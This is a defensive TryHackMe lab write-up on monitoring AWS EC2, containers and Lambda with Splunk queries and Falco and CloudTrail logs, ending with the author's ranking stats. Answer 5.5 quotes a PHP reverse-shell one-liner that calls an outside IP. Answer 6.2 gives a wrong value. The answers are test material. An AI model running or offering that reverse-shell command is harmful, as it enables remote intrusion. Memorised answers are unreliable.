<h1>Monitoring AWS Workloads<br><em>Splunk</em></h1>
<p>Learn how apps run in AWS and what you should know to effectively monitor them. https://tryhackme.com/room/monitoringawsworkloads</p>
<img width="1899" height="408" alt="image" src="https://github.com/user-attachments/assets/b1c4322d-a648-4f38-bbf1-d25a8b85e3ed" />


<br>
<h2>Task 1 - Introduction</h2>

<br>
<p><em>Answer the question below</em></p>

<p>1.1. Let´s begin!<br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 - Monitoring EC2</h2>
<br>
<p><em>Answer the question below</em></p>

<p>2.1. Which CloudTrail events can you use to track SSM commands and sessions? Answer Example: RunCommand, InitSession<br>
<code>SendCommands, StartSession</code></p>

<br>
<p>2.2. Which AWS service adjusts the right number of EC2 instances to match demand?<br>
<code>Amazon EC2 Auto Scaling</code></p>

<br>
<h2>Task 3 - Falco for EC2</h2>

<br>
<p><em>Answer the questions below</em></p>

<p>3.1. Investigate the low-level Falco events coming from ec2-demo. When was Morgan Blake's local password changed? Answer Example: 2026-01-15 12:30:45<br>
<code>2026-01-14 23:44:19</code></p>

```bash
index=task3 "*passwd*"
| rename output_fields.* as *
| rename proc.tty as logon.session, evt.rawres as exit.code
| table _time user.name logon.session proc.pid proc.cmdline proc.ppid proc.pexepath exit.code
```

<img width="1327" height="318" alt="image" src="https://github.com/user-attachments/assets/1b0d9676-3c75-4976-b7d1-d6477ca44759" />

<br>
<br>
<br>
<p>3.2. What GitHub repository name did Morgan clone to the VM?
Answer Example: terraform-templates<br>
<code>react-boilerplate</code></p>

```bash
index=task3 "*git*"
| rename output_fields.* as *
| rename proc.tty as logon.session, evt.rawres as exit.code
| table _time user.name logon.session proc.pid proc.cmdline proc.ppid proc.pexepath exit.code
```

<img width="1326" height="501" alt="image" src="https://github.com/user-attachments/assets/b79d3fec-a9a5-4456-acf8-f845e46d2787" />

<br>
<br>
<br>
<p>3.3. Now switch to the high-level alerts coming from srv-prodgw. What rule has triggered the alert you see?<br>
<code>Search Private Keys or Passwords</code></p>

```bash
index=task3 "srv-prodgw"
|  table _time hostname source rule output
```

<img width="1322" height="328" alt="image" src="https://github.com/user-attachments/assets/40832b50-a2b7-43aa-844c-6e4c7db1e2e7" />

<br>
<br>
<br>
<h2>Task 4 - Monitoring Containers</h2>

<p><em>Answer the questions below</em></p>

<p>4.1. Does an EC2 instance have access to the events of its containers? (Yea/Nay)<br>
<code>Yea</code></p>

<p>4.2. Is Initial Access to containers similar to that of plain EC2? (Yea/Nay)<br>
<code>Yea</code></p>

<br>
<h2>Task 5 . Falco for Containers</h2>

<br>
<p><em>Answer the questions below</em></p>

<p>5.1. Which two containers are visible in Falco logs? Answer Example: dev-website, prod-website<br>
<code>thm-db, thm-web</code></p>

<img width="1326" height="483" alt="image" src="https://github.com/user-attachments/assets/3e4db433-bb18-41b6-9ba9-dbc54960fac0" />

<br>
<br>
<br>
<p>5.2. What container image does the web container use? Answer Example: org/wordpress:stable<br>
<code>thm/website:latest</code></p>


<img width="1327" height="407" alt="image" src="https://github.com/user-attachments/assets/9978d775-4efc-4c41-a11d-ed682013d339" />

<br>
<br>
<br>
<p>5.3. What is the absolute path to the Apache web server?<br>
<code>/usr/sbin/apache2</code></p>

<img width="1329" height="483" alt="image" src="https://github.com/user-attachments/assets/c39f2412-dd92-4e91-b1dc-4fd1c0cd7c14" />

<br>
<br>
<br>
<p>5.4. What was the first Discovery command executed through the web?<br>
<code>whoami</code></p>

```bash
index=task5 output_fields.container.name="thm-web" "*/usr/sbin/apache2*"
|  table _time hostname rule output_fields.container.name output_fields.proc.cmdline
|  sort by +_time
```

<img width="1333" height="358" alt="image" src="https://github.com/user-attachments/assets/a5e71899-4ba1-4b9f-96b1-de79369f4a90" />

<br>
<br>
<br>
<p>5.5. What command line allowed the attacker to open a reverse shell?<br>
<code>php -r '$sock=fsockopen("115.190.98.228",9999);exec("bash <&3 >&3 2>&3");'</code></p>


<br>
<h2>Task 6 . AWS Lambda Theory</h2>
<br>
<p><em>Answer the questions below</em></p>

<p>6.1. What role was assigned to the function during its creation?<br>
<code>img-processor-role-ztpjz457</code></p>

```bash
index=task6 eventSource="lambda.amazonaws.com" readOnly=false
| table eventTime eventSource eventName SourceIPAddress requestParameters.role responseElements.role
| sort by +eventTime
```

<img width="1331" height="466" alt="image" src="https://github.com/user-attachments/assets/4f03ccbd-dc19-48b4-81bd-79768faca6e9" />

<br>
<br>
<br>
<p>6.2. What is the function's codeSha256 after the change in its code?<br>
<code>img-processor-role-ztpjz457</code></p>

```bash
index=task6 eventSource="lambda.amazonaws.com" readOnly=false
|  table eventTime eventSource eventName requestParameters.role responseElements.role responseElements.codeSha256
| sort by +eventTime
```

<img width="1322" height="606" alt="image" src="https://github.com/user-attachments/assets/baa645d1-0971-4eec-aa01-70ef6e0c8b63" />

<br>
<br>
<br>
<p>6.3. Soon after, the role of the function has been changed. What is the name of the new execution role?<br>
<code>ImageProcessorRole</code></p>

<img width="1322" height="606" alt="image" src="https://github.com/user-attachments/assets/d1077d5d-85d6-42e7-9bd0-60f437834336" />

<br>
<br>
<br>
<p>6.4. Lastly, the function has been made publicly accessible. What CloudTrail event confirms this misconfiguration?<br>
<code>AddPermission20150331v2</code></p>

<img width="1322" height="606" alt="image" src="https://github.com/user-attachments/assets/8689ea99-6e2a-4fcb-a1af-5cd7a6a387bb" />

<br>
<br>
<br>
<h2>Task 7 . AWS Lambda Practice</h2>
<br>
<p><em>Answer the questions below</em></p>

<p>7.1. What user and access key interacted with the Lambda service? Answer Example: john.doe, AKIABCDEFGHJKLM<br>
<code>carl.brown, AKIAVZZK4G6EZH7GIZY3</code></p>

```bash
index=task7 ("CreateFunctio*n" OR "UpdateFunctionConfiguration*" OR "UpdateFunctionCode*" OR "AddPermissions*")
|  table eventTime eventName SourceIPAddrss user userIdentity.accessKeyId userIdentity.principalId userIdentity.usernName
|  sort by +eventTime
```

<img width="1331" height="293" alt="image" src="https://github.com/user-attachments/assets/ad8cabd1-a597-44eb-b05b-ce51c4a3c8ce" />

<br>
<br>
<br>
<p>7.2. The attacker overwrote the Lambda code with the malicious one. What is the size of the uploaded Python code?<br>
<code>1837</code></p>

```bash
index=task7 eventSource="lambda.amazonaws.com"
|  table table eventTime eventSource eventName sourceIPAddress responseElements.codeSize requestParameters.instancesSet.items{}.instanceId instance_type responseElements.instancesSet.items{}.iamInstanceProfile.arn 
| sort by +eventTime
```

<img width="1329" height="603" alt="image" src="https://github.com/user-attachments/assets/dfdfe3d2-bfe5-49e5-815e-1af41501e0dc" />

<br>
<br>
<br>
<p>7.3. The malicious code started two EC2 instances. What are their instance IDs? (Ascending, via comma)<br>
<code>i-054e705408f5fa5de, i-056219235e66e3f94</code></p>

```bash
index=task7 "*EC2*" eventSource="ec2.amazonaws.com"
|  table eventTime eventSource eventName sourceIPAddress requestParameters.instancesSet.items{}.instanceId instance_type responseElements.instancesSet.items{}.iamInstanceProfile.arn responseElements.instancesSet.items{}.networkInterfaceSet.items{}.privateDnsName
|  sort by +eventTime
```

<img width="1331" height="398" alt="image" src="https://github.com/user-attachments/assets/2a0e275e-d000-40f6-b6d6-3bf706df505a" />

<br>
<br>
<br>

```bash
index=task7 eventSource=ec2.amazonaws.com eventName=RunInstances
|  table responseElements.instancesSet.items{}.instanceId
| sort by +eventTime
```

<img width="1324" height="311" alt="image" src="https://github.com/user-attachments/assets/f16b6876-5639-43ba-94c8-abcb137ab507" />

<br>
<br>
<br>
<p>7.4. The code was updated again to install cryptominers on EC2 via SSM. What SSM "documentName" did the attacker use to install malware?<br>
<code>AWS-RunShellScript</code></p>


```bash
index=task7 eventSource=ssm.amazonaws.com requestParameters.documentName!=""
|  table eventTime eventType eventName sourceIPAddress userAgent requestParameters.documentName
|  sort by +eventTime
```

<img width="1323" height="332" alt="image" src="https://github.com/user-attachments/assets/d2d7bcb7-3175-441a-8654-7e2aa95c5fd0" />

<br>
<br>
<br>
<p>7.5. Which user-agent was used by Lambda to run the malicious code? Answer Example: aws-sdk/1.2.5<br>
<code>Boto3/1.40.4</code></p>

<img width="1323" height="332" alt="image" src="https://github.com/user-attachments/assets/812a619d-cdd5-414d-b2bb-9a4bd925b337" />

<br>
<br>
<br>
<h2>Task 8 . Conclusion</h2>
<p>In this room, you explored how different cloud workloads create unique monitoring challenges: EC2 Systems Manager needs dedicated rules to catch malicious commands, containers require specialized runtime visibility (for example, Falco), and AWS Lambda can appear at any stage of an incident. Combined with control plane and managed service monitoring from the previous rooms, you should now be prepared to monitor any AWS environment.</p>

<h3>Note for Other Clouds</h3>
<p>Microsoft Azure, Google Cloud, and other cloud providers offer equivalent workload options, so your monitoring strategy should remain consistent across platforms. For example, tools like Falco can be deployed in any environment, while AWS Lambda maps to Google Cloud Run on GCP and Azure Functions on Microsoft Azure. By focusing on core technologies such as container security and serverless compute, you can easily switch clouds and set up monitoring from scratch.</p>

<br>
<p><em>Answer the question below</em></p>

<p>8.1Complete the room!<br>
<code>No answer needed</code></p>

<h2>Completed</h2>

<img width="1902" height="921" alt="image" src="https://github.com/user-attachments/assets/9d3b7281-a1e7-40a9-af3b-a126b328eaee" />

<img width="726" height="197" alt="image" src="https://github.com/user-attachments/assets/5062d582-6922-48c9-b60e-eb22f1ba9e71" />

<img width="1906" height="726" alt="image" src="https://github.com/user-attachments/assets/2ac38985-3cff-4a7d-914b-f5a813f7c797" />


<h2>My Journey</h2>

<p>Global All Time: 20th</p>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/b1719ce6-ff50-4c26-b4aa-b0c553cc5d1e" />

<img width="1891" height="926" alt="image" src="https://github.com/user-attachments/assets/af8919e3-d6d1-4def-8974-bc7174ffb700" />

<p>Global Monthly: 9th</p>

<img width="1890" height="928" alt="image" src="https://github.com/user-attachments/assets/eca1e949-48e6-4d5b-8de1-911b1742f9f1" />

<p>Brazil All Time: 2nd</p>

<img width="1889" height="934" alt="image" src="https://github.com/user-attachments/assets/aca551e2-8f03-4b66-8f22-252bfafd06fa" />

<p>Brazil Monthly: 1st</p>

<img width="1882" height="928" alt="image" src="https://github.com/user-attachments/assets/2142fabb-d9d7-42b8-9bc0-7375c4f208aa" />

<p>League: Diamond 3rd</p>

<img width="686" height="348" alt="image" src="https://github.com/user-attachments/assets/654419ef-3482-4564-b8f9-aeb5ce0832de" />

<p>Stats<br>
Streak:63<br>
Points: 157,994<br>
Rooms Completed: 1,139</p>

<img width="343" height="231" alt="image" src="https://github.com/user-attachments/assets/91f8bce1-52fd-403f-a165-2ed33ccce1f4" />
